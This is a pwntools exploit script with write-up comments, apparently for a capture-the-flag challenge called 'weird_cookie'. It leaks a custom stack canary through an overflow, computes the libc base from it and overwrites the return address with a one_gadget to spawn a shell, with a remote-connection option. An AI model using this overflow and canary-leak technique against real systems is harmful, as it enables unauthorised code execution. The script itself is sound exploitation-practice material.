from pwn import *

# ================================================================= WRITEUP
# --------------------- HOW TO RUN A DIFFERENT LIBC
# How to run with a specific LIBC version
# Use pwninit project: https://github.com/io12/pwninit
#
# --------------------- EXFILTRATE CANARY
# Is a custom canary so, it has not the '0a' protection so we can exfiltrate with the read-puts combination of the binary
# We take advantage of overwrite to exfiltrate the canary
# 
# --------------------- ONE GADGET ADDRESS
# Because of the space we have to write: 
# Total: 0x40 = 64
# 40 ('A') + 8 ('canary') + 8 ('RBP') + 8 ('ret address/ exploit address')
# We need to use just one gadget
# Tool: https://github.com/david942j/one_gadget


libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")
# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw, env={"LD_PRELOAD": libc.path})
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './weird_cookie_patched_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

libc = ELF("./libc-2.27.so")
padding = 40


# Start program
io = start()
# ############################################################################################################################## 1
# ==================================================== EXFILTRATE CANARY AND WHERE ARE WE
# Send the payload and exfiltrate the canary
exfiltrate_canary = "A" * padding 
io.sendafter(b'overflow me?', exfiltrate_canary)
data = io.recvn(56)
canary = data[41:49]

# ==================================================== START AGAIN
# Generate payload
# Get the bin/sh and the system in onegadget 
libc_base = int.from_bytes(bytes([_a ^ _b for _a, _b in zip(b'\x12\x34\x56\x78\x9a\xbc\xde\xf1', canary[::-1])]), 'big') - libc.sym['printf']
gadget = p64(libc_base + 0x4f2a5)
payload = asm('nop') * padding + canary + asm('nop') * 8 + gadget

# BOOM!
io.sendafter(b'overflowed it right? Try again.', payload)


# Got Shell?
io.interactive()
